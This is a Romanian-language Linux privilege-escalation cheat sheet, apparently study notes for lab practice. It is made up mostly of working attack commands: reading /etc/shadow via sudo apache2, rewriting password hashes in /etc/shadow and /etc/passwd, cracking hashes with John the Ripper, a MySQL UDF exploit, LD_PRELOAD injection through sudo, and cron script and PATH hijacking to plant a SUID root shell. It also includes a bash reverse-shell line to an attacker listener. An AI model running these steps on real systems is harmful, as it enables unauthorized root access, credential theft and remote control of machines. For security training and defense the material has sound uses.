# Linux Privilege Escalation (PrivEsc)

Privilege Escalation reprezintă exploatarea unei erori de configurare, vulnerabilități sau permisiuni neadecvate pentru a obține drepturi de administrator (`root` / `uid=0`) pornind de la un cont cu permisiuni reduse.

---

## 1. Recunoaștere Sudo & Arbitrary File Read

### Inspectarea privilegiilor curente
`sudo -l`
* Listează binarele pe care utilizatorul curent le poate rula cu drepturi de root (definite în `/etc/sudoers`).
* Referință rapidă pentru metode de evadare: https://gtfobins.github.io

### Citirea fișierelor arbitrare prin Apache2
Dacă utilizatorul poate executa `apache2` via `sudo`, parametrul `-f` (specificare fișier de configurare alternativ) forțează citirea fișierelor restricționate:
`sudo apache2 -f /etc/shadow`
* **Mecanism:** Apache deschide fișierul protejat ca root. Când întâlnește prima linie invalidă pentru sintaxa sa web, oprește execuția și afișează conținutul acelei linii în mesajul de eroare (`Syntax error ... Invalid command 'root:$6$...'`), dezvăluind hash-ul parolei pe ecran.

---

## 2. Weak File Permissions (/etc/shadow & /etc/passwd)

### Generare Hash Linux compatibil (SHA-512 crypt)
* Folosind OpenSSL: `openssl passwd -6 'ParolaAleasa'`
* Folosind mkpasswd: `mkpasswd -m sha-512 'ParolaAleasa'`

### Exploatare /etc/shadow modificabil (World-Writable)
Fișierul are o structură strictă de 9 câmpuri separate prin `:`:
`user:hash:lastchanged:min:max:warn:inactive:expire:reserved`

* **Pași:**
  1. Se generează hash-ul noii parole.
  2. Se editează fișierul și se înlocuiește **exclusiv câmpul 2** (între primul și al doilea `:`), păstrând toți ceilalți delimitatori:
     `root:$6$noul_hash...:18750:0:99999:7:::`
  3. Autentificare: `su root` folosind noua parolă.

### Exploatare /etc/passwd modificabil (World-Writable)
* În linia standard `root:x:0:0:root:/root:/bin/bash`, caracterul `x` instruiește sistemul să caute hash-ul parolei în `/etc/shadow`.
* **Bypass:** Înlocuirea directă a caracterului `x` cu un hash generat determină sistemul să verifice parola exclusiv din `/etc/passwd`, ignorând complet `/etc/shadow`:
  `root:$6$noul_hash...:0:0:root:/root:/bin/bash`
* **Notă de integritate:** Păstrează numele `root` intact; redenumirea contului împiedică utilitare precum `sudo` să funcționeze (`sudo: unknown user: root`).

---

## 3. Password Cracking (John the Ripper)

* **Concept:** Hashing-ul este o operație unidirecțională (one-way). John the Ripper nu decriptează hash-uri, ci realizează un atac pe bază de dicționar (*dictionary attack*): calculează hash-ul fiecărui cuvânt din listă și compară rezultatul cu hash-ul țintă până la potrivire.

### Pregătire Dicționar (Kali Linux)
`sudo gzip -d /usr/share/wordlists/rockyou.txt.gz`

### Rulare Atac
* Executare dicționar pe fișierul cu hash-ul extras:
  `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
* Afișare credențiale identificate:
  `john --show hash.txt`

---

## 4. MySQL UDF (User-Defined Functions) Exploitation

Condiții preliminare: serviciul MySQL rulează ca `root` și permite autentificarea locală neparolată (`mysql -u root`).

### 1. Compilare Exploit (raptor_udf2.c)
* Compilare Position Independent Code (-fPIC):
  `gcc -g -c raptor_udf2.c -fPIC`
* Generare Shared Object (.so) cu SONAME definit:
  `gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`

### 2. Încărcare bibliotecă în MySQL
* `use mysql;`
* `create table foo(line blob);`
* `insert into foo values(load_file('/tmp/raptor_udf2.so'));`
* `select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';`
* `create function do_system returns integer soname 'raptor_udf2.so';`

### 3. Creare Shell SUID & Escaladare
* În consola MySQL:
  `select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`
  `exit;`
* În terminalul bash:
  `/tmp/rootbash -p`
* Curățare artefacte:
  `rm /tmp/rootbash`
  `exit`

---

## 5. Sudo Environment Variables (LD_PRELOAD)

### Mecanism & Vulnerabilitate
La rularea `sudo -l`, dacă în secțiunea `env_keep` apare definit:
Defaults    env_keep += LD_PRELOAD

Înseamnă că `sudo` nu curăță variabila de mediu `LD_PRELOAD` la tranziția către administrator. Linker-ul dinamic (`ld.so`) este forțat să încarce biblioteca specificată înaintea oricărei alte biblioteci a programului țintă. Deoarece programul rulează prin `sudo`, codul din biblioteca injectată este executat direct cu privilegii de `root` (`uid=0`).

### Pași de exploatare

1. Compilare fișier Shared Object (.so):
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
* -fPIC: Position Independent Code (necesar pentru biblioteci partajate).
* -shared: Generează fișierul .so.
* -nostartfiles: Omite funcția standard de start (main).

2. Execuție via sudo cu injectare de bibliotecă:
Se poate folosi orice program permis în sudo -l (ex: apache2):
sudo LD_PRELOAD=/tmp/preload.so apache2

3. Verificare privilegii:
id
* Output așteptat: uid=0(root) gid=0(root) groups=0(root)



---

## 6. Cron Jobs PrivEsc & Netcat Listener

### Mecanism & Vulnerabilitate
Task-urile din cron rulează strict cu permisiunile utilizatorului care le deține (al 6-lea câmp din crontab). Dacă un cronjob este deținut de `root`, dar scriptul executat are permisiuni de scriere pentru utilizatori obișnuiți (*world-writable*) sau dacă variabila `PATH` este configurată nesigur, un atacator poate obține execuție de comenzi cu drepturi depline de `root`.

### Inspectare Cron Jobs
cat /etc/crontab
ls -la /etc/cron.*

Structura unei linii din /etc/crontab:
* * * * * root /usr/local/bin/backup.sh
(Minut | Oră | Zi din lună | Lună | Zi din săptămână | Utilizator | Comandă/Script)

### Listener Netcat (nc -nvlp)
Utilitar folosit pe mașina de atac pentru a aștepta o conexiune de intrare (Reverse Shell):
nc -nvlp 4444

Semnificația flag-urilor:
* -n: Numeric-only. Dezactivează rezoluția DNS pentru viteză și stabilitate.
* -v: Verbose. Afișează mesaje despre starea conexiunii (ex: "Connection received...").
* -l: Listen. Pornește modul server/ascultare pentru conexiuni noi.
* -p: Port. Definește numărul portului pe care ascultă listener-ul.

### Metoda 1: Exploatare Script Writable (Permisiuni Slabe)
1. Injectează un payload care creează o copie de bash cu bit SUID:
echo "cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash" >> /usr/local/bin/backup.sh

2. Sau injectează un Reverse Shell către listener-ul de pe mașina ta de atac:
echo "bash -i >& /dev/tcp/10.x.x.x/4444 0>&1" >> /usr/local/bin/backup.sh

3. După ce minutul s-a scurs și cron-ul a rulat comanda:
/tmp/rootbash -p
id
* Output așteptat: uid=0(root) gid=0(root) groups=0(root)

### Metoda 2: Cron PATH Hijacking
Apare când în `/etc/crontab` variabila `PATH` începe cu un director la care utilizatorul are acces de scriere (ex: `PATH=/home/user:...`), iar comanda apelată este relativă (ex: `overwrite.sh` în loc de calea completă `/usr/local/bin/overwrite.sh`).

1. Creează scriptul malițios direct în folderul prioritar (/home/user):
cat << 'EOF' > /home/user/overwrite.sh
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
EOF

2. Fă fișierul executabil:
chmod +x /home/user/overwrite.sh

3. Așteaptă rularea cron-ului (sub 1 minut) și rulează binarul cu SUID:
/tmp/rootbash -p
* chmod +xs: Fiind rulat de root, binarul /tmp/rootbash va aparține lui root și va avea SUID setat.
* -p: Privileged mode (împiedică bash să renunțe la privilegiile de root).

4. Curățare artefacte:
rm /tmp/rootbash
exit
